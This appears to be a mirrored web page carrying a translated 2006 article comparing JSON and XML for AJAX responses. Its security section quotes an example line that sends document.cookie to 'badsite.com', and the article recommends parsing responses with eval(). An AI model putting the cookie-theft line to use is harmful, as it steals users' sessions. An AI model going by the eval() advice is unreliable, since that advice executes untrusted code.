<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>JSON and XML. What's better?</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Note: the following is a translation of the JSON vs XML review article on JSON and its comparison with XML according to a number of criteria. It is pu...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>JSON and XML. What's better?</h1><div class="post__text post__text-html js-mediator-article">  <em>Note: the following is a translation of the <a href="http://www.subbu.org/weblogs/main/2006/08/json_vs_xml_1.html">JSON vs XML</a> review article on JSON and its comparison with XML according to a number of criteria.</em>  <em>It is published in order to popularize JSON among Habrahabr's readers.</em> <br><br><blockquote>  JSON (English JavaScript Object Notation) is a data exchange format that is easy to read by people, easily processed and generated by programs. <br><br>  Based on a subset of the <a href="http://ru.wikipedia.org/wiki/JavaScript">JavaScript</a> language, <a href="http://www.ecma-international.org/publications/files/ecma-st/ECMA-262.pdf">Standard ECMA-262 3rd Edition - December 1999</a> . </blockquote><br>  <em><a href="http://ru.wikipedia.org/wiki/JSON">JSON - Wikipedia</a></em> 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      What is the correct response format for <code>XMLHttpRequest</code> in AJAX applications?  For most markup-based applications, the answer will be simple - (X) HTML.  For information-oriented applications, the choice will lie between XML and JSON.  Until recently, I didn‚Äôt really wonder if it‚Äôs better to use XML or JSON.  I just assumed that in each particular case it is worth choosing the most suitable format, that's all.  But recently I happened to test this approach in practice.  In this post I will describe the criteria by which I made a comparison between XML and JSON, and my own conclusions. <br><br>  So, the following criteria. <br><br><ul><li>  Readability code. </li><li>  Easy to create a data object on the server side. </li><li>  Simplicity of data processing on the client side. </li><li>  Easy to expand. </li><li>  Debugging and correction of errors. </li><li>  Security. </li></ul><br><a name="habracut"></a><br><br><h2>  Readability code </h2><br><br>  Peter-Paul Koch c <a href="http://www.quirksmode.org/">QuirksMode.org</a> considers the readability of the code as the main criterion for <a href="http://www.quirksmode.org/blog/archives/2005/12/the_ajax_respon.html">its analysis</a> .  In my opinion, it is only a secondary goal, but you can easily agree that JSON is much easier perceived "by eye" than XML - you just have to look at the following examples. <br><br><h4>  <strong>XML</strong> </h4><pre>    &lt;font color = "# 069"&gt; &lt;person&gt; &lt;/ font&gt;
       &lt;font color = "# 069"&gt; &lt;firstname&gt; &lt;/ font&gt; Subbu &lt;font color = "# 069"&gt; &lt;/ firstname&gt; &lt;/ font&gt;
       &lt;font color = "# 069"&gt; &lt;lastname&gt; &lt;/ font&gt; Allamaraju &lt;font color = "# 069"&gt; &lt;/ lastname&gt; &lt;/ font&gt;
    &lt;font color = "# 069"&gt; &lt;/ person&gt; &lt;/ font&gt;
</pre><br><br><h4>  <strong>Json</strong> </h4><pre>    ({   
      &lt;font color = "# 069"&gt; "firstName" &lt;/ font&gt;: &lt;font color = "# 069"&gt; "Subbu" &lt;/ font&gt;,
      &lt;font color = "# 069"&gt; "lastName" &lt;/ font&gt;: &lt;font color = "# 069"&gt; "Allamaraju" &lt;/ font&gt;
    });
</pre><br><br>  But I‚Äôm willing to bet that debugging and fixing bugs is much more important than readability. <br><br><h2>  Ease of creation </h2><br><br>  The XML format has been known for many years ( <em>note: the first working version <a href="http://www.w3.org/TR/WD-xml-961114">was announced in 1996</a> , and the <a href="http://www.w3.org/TR/2000/REC-xml-20001006">specification was already in 2000</a></em> ), therefore there is a certain set of program interfaces ( <em>APIs</em> ) for data binding to XML in several programming languages.  For example, in Java, you can use <a href="http://java.sun.com/webservices/jaxb/index.jsp">JAXB</a> and <a href="http://xmlbeans.apache.org/">XmlBeans</a> to create an XML response.  Below is an example using JAXB. <br><br><pre>    Person person = &lt;font color = "# 069"&gt; new &lt;/ font&gt; Person ();
    person.setFirstName (&lt;font color = "# 069"&gt; "Subbu" &lt;/ font&gt;);
    person.setLastName (&lt;font color = "# 069"&gt; "Allamaraju" &lt;/ font&gt;);
    Marshaller marshaller = ... &lt;font color = "# 008200"&gt; // Create a marshaller object &lt;/ font&gt;
    marshaller.marshal (person, outputStream);
</pre><br><br>  On the other hand, all interfaces for creating a JSON response appeared relatively recently.  However, a fairly impressive list has <a href="http://www.json.org/">been</a> published on <a href="http://www.json.org/">JSON.org</a> in various languages.  Below is an example of creating a response using <a href="http://json-lib.sourceforge.net/">Json-lib</a> . <br><br><pre>    Person person = &lt;font color = "# 069"&gt; new &lt;/ font&gt; Person ();
    person.setFirstName (&lt;font color = "# 069"&gt; "Subbu" &lt;/ font&gt;);
    person.setLastName (&lt;font color = "# 069"&gt; "Allamaraju" &lt;/ font&gt;);
    writer.write (JSONObject.fromObject (person) .toString ());
</pre><br><br>  If we consider the functioning of such software interfaces, then creating JSON is not much different from serializing Java beans into objects.  However, it is worth noting that now there are many more ways to generate XML, rather than JSON.  Some of these programming interfaces for XML have existed for many years and for this reason may be more stable when used for complex applications. <br><br>  Another aspect worth considering is the amount of resources that are used to generate the response.  If upon receiving data, ‚Äúheavy‚Äù operations are already being performed, then for the server part, it will not be too difficult to additionally convert them into XML for a response.  If the creation of XML will be the most resource-intensive operation, it is better to use JSON. <br><br><h2>  Ease of use </h2><br><br>  On the client side, handling JSON data as a response to an <code>XMLHttpRequest</code> extremely simple. <br><br><pre>    var person = eval (xhr.responseText);  
    alert (person.firstName);  
</pre><br><br>  Using the usual <code>eval()</code> , you can convert the response into a JavaScript object.  Once this operation has been performed, you can access the data using the properties of the converted object.  This is the most elegant part of all JSON. <br><br>  Now consider the XML.  To make the code snippet below more transparent, I removed all the error checks. <br><br><pre>    var xml = xhr.responseXML;
    var elements = xml.getElementsByTagName (&lt;font color = "# 069"&gt; "firstName" &lt;/ font&gt;);
    alert (elements [&lt;font color = "# c00000"&gt; 0 &lt;/ font&gt;]. firstChild.textContent);
</pre><br><br>  Obviously, when processing data received from the server, you need to view all the DOM tree.  This is a very time-consuming operation, and it is prone to errors.  Unfortunately, in the browser we have to deal specifically with the DOM.  Browsers do not support query languages, like XPath, for retrieving tree nodes in an XML document.  Support for these features is already XSLT, but it is quite limited ( <em>note: in the browser</em> ) in terms of converting XML into markup (for example, in HTML).  <a href="http://www.w3.org/2006/webapi/">The</a> W3C <em>Web API Working Group</em> <a href="http://www.w3.org/2006/webapi/">on Software Interfaces is</a> working on <a href="http://www.w3.org/TR/selectors-api/">a</a> <em>Selectors API</em> , which can be used to apply CSS selectors when selecting nodes from the <code>Document</code> object.  Using this interface, you can convert the above code example to <code>xml.match("person.firstName")</code> to get the <code>firstName</code> element.  Not to say that this is a great achievement for the XML document from this example, but it can be useful for working with highly branched documents.  This interface is not yet complete, and it will be years before browsers support it. <br><br>  In general, if I choose between XML and JSON, I prefer JSON because of the simplicity of the implementation on the client side. <br><br><h2>  Extensibility </h2><br><br>  Extensibility helps reduce the number of connections between the provider and the recipient.  In the context of AJAX applications, the client-side script must be fairly invariant with respect to compatible changes in data. <br><br>  <a href="http://blogs.ebusiness-apps.com/dave/%3Fp%3D43">It is widely believed</a> that XML is automatically extensible simply due to the presence of the letter ‚ÄúX‚Äù.  But this is not an unconditional rule (i.e. valid by default).  XML extensibility is based on the principle that you can define additional nodes in your XML, and then apply the ‚Äúskip unnecessary‚Äù rule (that is, if you encounter an unfamiliar element or attribute when processing XML, just skip it). <br><br>  To take full advantage of extensibility, you need to create code on the client side with the expectation of this very extensibility.  For example, the following example will collapse if you want to insert, for example, the element <code>middleName</code> . <br><br><pre>   var xml = xhr.responseXML; 
   var elements = xml.getElementsByTagName (&lt;font color = "# 069"&gt; "firstName" &lt;/ font&gt;);
   var firstNameEl = elements [&lt;font color = "# c00000"&gt; 0 &lt;/ font&gt;];
   var lastNameEl = firstNameEl.nextSibling;
</pre><br><br>  If you insert a <code>&lt;middleName&gt;</code> element immediately after the <code>&lt;firstName&gt;</code> element, in this example, the middle name will be interpreted incorrectly as a last name.  To be invariant with respect to this change, you need to rewrite the code to explicitly get the <code>&lt;lastName&gt;</code> element, or to <code>nextSibling</code> , only if a descendant with the desired <code>tagName</code> .  Thus, XML is extensible as long as you write code, relying on future extensibility.  Everything is very simple. <br><br>  Let's go back to JSON.  I argue that extending JSON data is easier than XML.  This certainly requires less effort.  Consider adding a <code>middleName</code> property to a JSON response.  To access it, you just need to call it. <br><br><pre>    alert (person.middleName);
</pre><br><br>  This code will <strong>not</strong> change if you add a middle name to your answer.  But what to do in the case of processing a person with or without a middle name?  With JSON it's easy. <br><br><pre>   &lt;font color = "# 069"&gt; if &lt;/ font&gt; (person.middleName) {
     &lt;font color = "# 008200"&gt; // Processing &lt;/ font&gt;
   }
</pre><br><br>  My position is that, if we bear in mind the possible future extensibility, and XML-, JSON-data can be extended.  But with JSON, extending data is easier than with XML.  You just need to check that the required property exists on the object, and act in accordance with the result of the check. <br><br>  There is another possibility to extend JSON data, it is to use function calls with data declarations directly in the response. <br><br><pre>   alert (&lt;font color = "# 069"&gt; "Hi - I'm a person" &lt;/ font&gt;);
   ({&lt;font color = "# 069"&gt; "firstName" &lt;/ font&gt;: &lt;font color = "# 069"&gt; "Subbu" &lt;/ font&gt;,
     &lt;font color = "# 069"&gt; "lastName" &lt;/ font&gt;: &lt;font color = "# 069"&gt; "Allamaraju" &lt;/ font&gt;});
</pre><br><br>  When data is declared via <code>eval()</code> , the browser will also invoke the expression <code>alert()</code> .  In this case, you can both load data and execute functions.  This approach should be used with great care, because it foul up the response with function calls and creates a link between the calls and the data.  Some sources also consider the potential vulnerability of such an approach from a security point of view, a bit more detailed below. <br><br><h2>  Debugging and error correction </h2><br><br>  This aspect concerns both the server part of your application and the client part.  On the server, you need to make sure that the data is correctly formed and correct.  On the client side, it should be easy to debug errors in the response. <br><br>  In the case of XML, it is relatively easy to verify that the data sent to the client is well formed and correct.  You can use the <code>schema</code> for your data, and apply it to validate the data.  With JSON, this task becomes manual and requires verification that, as a result of the response, an object has the correct attributes. <br><br>  On the client side in both cases it is difficult to detect errors.  For XML, the browser will simply not be able to convert it to responseXML.  With small amounts of JSON data, you can use the <a href="https://addons.mozilla.org/firefox/1843/">FireBug</a> extension to debug and fix errors.  But with large amounts of data it becomes somewhat difficult to correlate the error message with a specific place in the code. <br><br><h2>  Security </h2><br><br>  <a href="http://blogs.ebusiness-apps.com/dave">Dave Johnson,</a> in his <a href="http://blogs.ebusiness-apps.com/dave/%3Fp%3D43">JSON</a> note, <a href="http://blogs.ebusiness-apps.com/dave/%3Fp%3D43">and the Golden Fleece,</a> suggests that JSON can cause security problems.  The essence of the note comes down to the fact that if you allow the insertion of function calls along with the data in JSON responses and use <code>eval()</code> to process the response, then you execute arbitrary code, in fact, which may already contain a security risk. <br><br><pre>   window.location = &lt;font color = "# 069"&gt; "http://badsite.com?" &lt;/ font&gt; + document.cookie;
   person: { 
     &lt;font color = "# 069"&gt; "firstName" &lt;/ font&gt;: &lt;font color = "# 069"&gt; "Subbu" &lt;/ font&gt;,
     &lt;font color = "# 069"&gt; "lastName" &lt;/ font&gt;: &lt;font color = "# 069"&gt; "Allamaraju" &lt;/ font&gt;
   }
</pre><br><br>  If the answer in the example above is completed, this will cause the browser to send user cookies to a third-party site.  But in this case, there is some misconception in determining the security threat.  Do not trust the data or code obtained from an unverified source.  And secondly, we cannot use <code>XMLHttpRequest</code> to communicate with domains other than the source domain of the script.  So, only developers themselves when creating an application can initiate sending cookies to a third-party site.  This is quite doubtful, because they might as well place this malicious code anywhere in the document outside of the data response sent from the server.  Maybe I missed something, but I see no reason to treat JSON as unsafe compared to XML. <br><br><h2>  My choice </h2><br><br>  In the case of information-oriented applications, I prefer to use JSON, rather than XML, because of its simplicity and ease of data processing on the client side.  XML can be indispensable on the server, but with JSON it is definitely easier to work on the client. <br><br><h2>  Related Links </h2><br><br><ul><li>  <a href="http://ru.wikipedia.org/wiki/JSON">JSON on Wikipedia</a> </li><li>  <a href="http://www.json.org/json-ru.html">Introduction to JSON</a> </li><li>  <a href="http://jeremiahgrossman.blogspot.com/2006/01/advanced-web-attack-techniques-using.html">Advanced Web Attack Techniques using GMail</a> </li></ul><br><br>  <em>Thanks to everyone who read this translation.</em>  <em>Appreciate and respect your opinions and comments.</em>  <em>I will try to take into account all the wishes and do not stay in debt.</em>  <em>If you have any suggestions on the subject of future translations, do not hesitate to write them - I will try to make a selection or a detailed review of materials on these topics.</em>  <em>Thanks for attention.</em> <br><br>  <a href="http://webo.in/">Web Optimizator: checking the speed of loading sites</a> <br></div><p>Source: <a href="https://habr.com/ru/post/31225/">https://habr.com/ru/post/31225/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../312236/index.html">How MikroTik sees neighbors. Neighbor discovery update in RouterOS 6.38</a></li>
<li><a href="../312238/index.html">Bram Cohen: I wrote BitTorrent sitting in the living room, unemployed, in shorts</a></li>
<li><a href="../31224/index.html">Report Multimedia Semantics Incubator Group at W3C</a></li>
<li><a href="../312240/index.html">Filter events by categories in the Event Map report</a></li>
<li><a href="../312248/index.html">Feedback on Growing Object-Oriented Software, Guided by Tests</a></li>
<li><a href="../312250/index.html">Open access to the tool for compiling lists of English words from films, books and articles</a></li>
<li><a href="../312256/index.html">LINQ: Dynamic Query Filtering</a></li>
<li><a href="../312258/index.html">A sysadmin with delusions of automation and a big remake of processes</a></li>
<li><a href="../312260/index.html">A bit about security in the "cloud": Experience IaaS-provider "1cloud"</a></li>
<li><a href="../312262/index.html">Live Webcast Progressive Web Apps Day Begins</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>